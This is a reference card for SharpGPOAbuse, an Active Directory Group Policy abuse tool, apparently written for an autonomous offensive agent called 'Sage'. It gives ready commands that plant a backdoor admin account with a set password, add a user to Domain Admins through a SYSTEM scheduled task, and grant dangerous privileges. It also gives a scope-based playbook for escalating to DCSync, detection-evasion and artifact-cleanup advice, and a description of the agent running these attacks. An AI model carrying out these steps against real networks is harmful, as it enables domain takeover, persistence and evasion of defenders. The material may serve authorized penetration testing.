---
name: SharpGPOAbuse
category: acl-abuse
subcategories: [gpo-abuse, code-execution, local-admin-add]
tradecraft_tags: [gpo, group-policy, code-exec, privilege-escalation, acl-abuse]
mitre_attack:
  - id: T1484.001
    name: Domain Policy Modification — Group Policy Modification
source:
  url: https://github.com/FSecureLABS/SharpGPOAbuse
  license: MIT
  maintained: false
binary_type: .net-assembly
binary_filename: SharpGPOAbuse.exe
supported_os: [windows]
architecture: [x64, x86]
privilege_required: domain-user
network_required: true
detection_signal: |
  GPO modification is logged in the SYSVOL share (file writes) and generates AD events
  (Event 5136 on DC). Group Policy client-side processing on target machines generates
  Event 4739 (GPO applied) and other policy change events. SYSVOL replication propagates
  changes within the replication interval. MDI detects GPO modification by non-admin
  principals. DFSR replication metadata is also an artifact.
usage_examples:
  - description: Add a user to local administrators via GPO
    args: "--AddLocalAdmin --UserAccount attacker --GPOName VulnerableGPO"
  - description: Add a scheduled task to GPO (runs as SYSTEM on targets)
    args: "--AddComputerTask --TaskName 'SysUpdate' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c whoami > C:\\Windows\\Temp\\out.txt' --GPOName VulnerableGPO"
  - description: Add a user-run scheduled task (runs in user context)
    args: "--AddUserTask --TaskName 'UpdateCheck' --Author 'NORTH\\jon.snow' --Command 'cmd.exe' --Arguments '/c calc.exe' --GPOName VulnerableGPO"
  - description: Add a startup/shutdown script to GPO
    args: "--AddComputerScript --ScriptName update.bat --ScriptContents 'net user backdoor P@ss123! /add && net localgroup administrators backdoor /add' --GPOName VulnerableGPO"
  - description: Add user rights (SeDebugPrivilege) via GPO
    args: "--AddUserRights --UserRights SeDebugPrivilege --UserAccount attacker --GPOName VulnerableGPO"
opsec_notes: |
  GPO modifications are persistent — the change remains until manually reverted or
  the GPO is deleted. Every machine in the GPO's scope will receive the modification
  at the next Group Policy refresh. TIMING MATTERS for any dependent step: a **Domain
  Controller refreshes ~every 5 minutes** (`GroupPolicyRefreshTimeDC`, default 5 min) — much
  faster than member hosts (default 90 minutes ± 30 minute jitter); `gpupdate /force` applies
  immediately but needs execution ON the target. Enumerate the configured interval with
  `reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC`
  (value in minutes; absent = default). Do NOT rely on the GPO's effect until it has applied —
  POLL the effect (e.g. re-check group membership) until it confirms before the dependent hop.
  NOTE: after a self-granting GROUP-ADD, your existing Kerberos ticket still predates the change — refresh it
  (NO password needed: `Rubeus purge` / `klist purge`, then `dir \\<dc>\C$` or `Rubeus tgtdeleg` so LSASS
  re-issues a TGT carrying the new group SID) before using the new privilege, or DCSync fails 8439/8453.
  SYSVOL writes generate file-system audit events if enabled.
  MDI has detection for non-admin GPO modifications. Clean up GPO modifications after
  achieving the objective to avoid long-lasting artifacts.
gotchas: |
  SharpGPOAbuse requires GenericWrite or GpoEditDeleteModifySecurity over the target GPO
  object — not just on the OU. Verify the correct GPO name (as it appears in AD, not
  the display name in GPMC) and that the GPO is linked to a scope that includes target
  machines. If the GPO is linked but not enforced, link order and inheritance blocking
  can prevent it from applying. Scheduled task command execution is as SYSTEM — use for
  privilege escalation, not lateral movement with user context. Cleanup: remove the
  added element from the GPO after exploitation. The project is not actively maintained
  (last commit ~2020) — test in lab before relying on it against newer Windows.
related_ttps: [sharphound, whisker, standin, sharpup]
alternatives: [grouper2, powersploit-gpo, manual-gpo-edit]
common_args:
  --AddLocalAdmin:
    description: Add a user to the local Administrators group via GPO
    typical_values: [flag-only]
  --AddComputerTask:
    description: Add a scheduled task that runs as SYSTEM on all computers in GPO scope
    typical_values: [flag-only]
  --AddUserTask:
    description: Add a scheduled task that runs in user context
    typical_values: [flag-only]
  --AddComputerScript:
    description: Add a computer startup/shutdown script
    typical_values: [flag-only]
  --AddUserRights:
    description: Add a privilege to a user via GPO User Rights Assignment
    typical_values: [flag-only]
  --GPOName:
    description: Name of the GPO to modify (must match AD GPO display name)
    typical_values: ["Default Domain Policy", "VulnerableGPO"]
    required: true
  --UserAccount:
    description: Target user account for LocalAdmin or UserRights operations
    typical_values: ["attacker", "NORTH\\\\attacker"]
  --TaskName:
    description: Display name for the scheduled task
    typical_values: ["SysUpdate", "WindowsMaint"]
  --Command:
    description: Command to execute in scheduled task or script
    typical_values: ["cmd.exe", "powershell.exe"]
  --Arguments:
    description: Arguments for the command
    typical_values: ["/c whoami > C:\\\\Windows\\\\Temp\\\\out.txt"]
last_updated: 2026-05-29
---

# SharpGPOAbuse

FSecureLABS' tool for exploiting misconfigured Group Policy Object (GPO) permissions.
When SharpHound identifies a controlled principal with write access to a GPO object
(GenericWrite, GpoEditDeleteModifySecurity, or WriteDACL), SharpGPOAbuse modifies the
GPO to achieve code execution or privilege escalation on all machines in the GPO's linked
scope. The most common attack patterns are adding a local administrator or adding a
SYSTEM-level scheduled task.

## Typical use cases
- Add an attacker account to local Administrators on all machines in GPO scope
- Execute arbitrary commands as SYSTEM via a GPO scheduled task
- Add dangerous privileges (SeDebugPrivilege, SeImpersonatePrivilege) to a user
- Add a startup/shutdown script with persistent backdoor
- Pivot from GenericWrite on a GPO to code execution on every machine in the scope

## How Sage uses this
SharpGPOAbuse is triggered by SharpHound-identified ACL paths: when SharpHound shows a
controlled principal with write rights over a GPO linked to a high-value target (e.g. a
GPO linked to the Domain Controllers OU, or to a machine hosting a service account),
Sage uses SharpGPOAbuse to add a local admin or scheduled task. The scheduled task
callback gives Sage SYSTEM-level access on all machines in scope. For scoped impact,
Sage prefers the local admin add (less noise than a new scheduled task running every hour).

## Choosing the abuse primitive — the GPO's SCOPE decides (do this FIRST)

Controlling a GPO is not the attack — it is *code execution as SYSTEM on every computer in the GPO's
scope*. WHAT that buys you depends entirely on WHICH computers are in scope, so **enumerate the scope
before choosing a payload.** Picking the payload first is the classic dead-end: a non-DA identity trying
to self-grant domain rights it has no permission to write.

**Step 1 — resolve the GPO's scope from the graph (not from a name):**
- What the GPO is LINKED to: `GPLink` edges → the OU(s) and/or the Domain object. A GPO linked at the
  **domain root** or the **Domain Controllers OU** applies to Domain Controllers.
- Which COMPUTERS fall under it: `GPLink → container →(Contains*)→ Computer`. (BloodHound's "Affected
  Objects" tab accounts for inheritance/enforcement — prefer it when available.)
- Which of those are **Domain Controllers**: a computer that is a member of the `Domain Controllers`
  group (RID `-516`), or that holds `DCSync`/`GetChangesAll` on the domain. Intersect this set with the
  affected-computers set from the previous bullet.

**Step 2 — pick the primitive by the privilege the SYSTEM context actually holds:**

| GPO scope (from Step 1) | What a SYSTEM computer-task gets you | Right primitive |
|--------------------------|--------------------------------------|-----------------|
| **A Domain Controller is in scope** (linked at domain root or the DC OU) | `NT AUTHORITY\SYSTEM` **on a DC** — which is domain-privileged | Make the DURABLE domain change directly from that context: add a controlled principal to a privileged group (`net group "Domain Admins" <DOMAIN\user> /add /domain` as a computer-task), **or** DCSync from the DC. You do NOT need to grant yourself anything. |
| **Only member servers / workstations** in scope (no DC) | local SYSTEM on those hosts only — **NOT** domain-privileged | Credential/token theft (LSASS of privileged sessions), ticket capture, lateral movement — then escalate via what you harvest. Do NOT attempt domain-object writes from here. |

**Step 3 — the self-grant trap (why "grant myself DS-Replication" usually fails).** Granting yourself
the two DS-Replication extended rights on the domain head (StandIn `--object <domain-DN> --grant`) is a
**DACL write on the domain object**, which requires that *the identity executing the grant* already holds
`WriteDACL`/`GenericAll`/`Owns`/`WriteOwner` on the Domain node (confirm with a BloodHound edge from your
principal → Domain). A normal domain user does NOT hold that, and **`NT AUTHORITY\SYSTEM` on a *member*
host does NOT either** (it is the machine account, not a domain admin). So a self-grant attempted from a
non-DA user or member-host SYSTEM returns *Access denied* no matter how reliably it is delivered. Only
self-grant when the graph shows your *current* identity already owns the domain-head DACL edge; otherwise
get the privilege from the right context (Step 2) and skip the grant.

**Heuristic:** if a "grant" or domain-object write is denied, the bug is almost always *identity/context*
(you are acting as a principal without the right), not *delivery* (the binary/task). Re-check the scope
and act from a context that already holds the privilege — do not iterate on delivery.

## Delivery — making the GPO change actually APPLY

Editing a GPO is not one write — it is THREE coordinated changes, and clients ignore a change that is
missing any of them. A bare "drop a file in SYSVOL" is a legitimate, sometimes-stealthier technique, but
it is INCOMPLETE on its own. For a Group Policy Preferences item (e.g. a scheduled task) to be processed:

1. **The artifact exists at the correct path** in the GPO's SYSVOL tree (for a Preferences scheduled task:
   `\\<domain>\SYSVOL\<domain>\Policies\{GPO-GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml`).
2. **The GPO advertises the matching Client-Side Extension (CSE)** — the `gPCMachineExtensionNames` LDAP
   attribute on the GPO object must include the CSE GUID pair for the feature you added (Preferences +
   the specific item type). If the CSE GUID is absent, clients do not know to read your file and SKIP it.
3. **The GPO version is incremented** — both the AD `versionNumber` attribute and the `Version=` line in
   `GPT.INI` must be bumped so clients detect a change and re-process on the next refresh.

So the choice is: **do all three yourself** (write the file + edit `gPCMachineExtensionNames` over LDAP +
bump both version counters), **or use a tool that does all three for you** (`--AddComputerTask`,
`--AddComputerScript`, `--AddUserRights`, etc.). A manual file write that skips #2/#3 leaves the artifact
inert in SYSVOL — the task never fires (this is the classic "I changed the GPO but nothing happened").

**Writing the artifact safely:** GPO XML contains `<`, `>`, `&` — do NOT write it with a shell `echo`
redirect (the shell interprets those as operators and the write fails or corrupts). Use a primitive that
takes literal bytes (file upload, base64-decode-to-file, or the tool itself).

**Then verify it applied** — don't assume the refresh interval. Force/await a policy refresh on a target in
scope and confirm the effect landed (the membership/right/task actually present), not just that the file
write returned success. A SYSVOL write succeeding says nothing about whether clients processed it.

## Output
Text confirmation to stdout indicating success or failure of the GPO modification.
Example: `[+] Local admin entry successfully added!`. The actual effect (local admin
membership, scheduled task execution) occurs when Group Policy refreshes on target machines
(up to 2 hours for background refresh; immediate with `gpupdate /force` from SYSTEM).

## OPSEC considerations
GPO modifications are persistent and affect ALL machines in the GPO's scope — be surgical
about which GPO you target. Broad-scope GPOs (e.g. "Default Domain Policy") will write
to every machine in the domain, creating massive forensic artifacts. Prefer GPOs linked
to specific OUs. Remove modifications immediately after use. The change will persist until
the next background Group Policy refresh on targets even after you clean up the GPO — plan
accordingly.

## Full Reference

> Captured against SharpGPOAbuse v1.0, 2026-05-29. Source: https://github.com/FSecureLABS/SharpGPOAbuse README.

### Available attack modes

| Mode | Effect |
|------|--------|
| `--AddLocalAdmin` | Adds user to local Administrators group on all machines in scope |
| `--AddComputerTask` | Adds a computer-context (SYSTEM) scheduled task to the GPO |
| `--AddUserTask` | Adds a user-context scheduled task (runs as the logged-on user) |
| `--AddComputerScript` | Adds a startup/shutdown script to the GPO |
| `--AddUserScript` | Adds a logon/logoff script to the GPO |
| `--AddUserRights` | Modifies User Rights Assignment (adds/removes privileges) |

### Argument listing by mode

#### AddLocalAdmin
| Arg | Description |
|-----|-------------|
| `--UserAccount X` | User (DOMAIN\user or just user) to add |
| `--GPOName X` | Target GPO name |

#### AddComputerTask
| Arg | Description |
|-----|-------------|
| `--TaskName X` | Task display name |
| `--Author X` | Author field (use `NT AUTHORITY\SYSTEM`) |
| `--Command X` | Executable path |
| `--Arguments X` | Command arguments |
| `--GPOName X` | Target GPO name |
| `--Scope X` | computer or user (default: computer) |
| `--RunAs X` | Run as this user (for user-scope tasks) |
| `--Force` | Force even if task already exists |

#### AddUserRights
| Arg | Description |
|-----|-------------|
| `--UserRights X` | Privilege constant (e.g. SeDebugPrivilege, SeImpersonatePrivilege) |
| `--UserAccount X` | User to receive the right |
| `--GPOName X` | Target GPO name |

### GPO permission requirements

- `GenericWrite` — full write access to GPO
- `GpoEditDeleteModifySecurity` — explicitly grants GPO edit permission
- `WriteDACL` — allows self-granting write permissions first

Use SharpHound's BloodHound output to identify principals with these rights on GPO objects.

### Group Policy refresh timing

- Background refresh: every 90 minutes ± 30 minute jitter (default)
- For immediate application: `gpupdate /force` on each target (requires access)
- DC policy refresh: every 5 minutes
- Reboot: always applies policy on next boot

### Source for this reference

- https://github.com/FSecureLABS/SharpGPOAbuse (README)
- FSecureLABS blog: https://labs.f-secure.com/tools/sharpgpoabuse/
- Version: v1.0 as of 2026-05-29 (unmaintained; test against target Windows version)
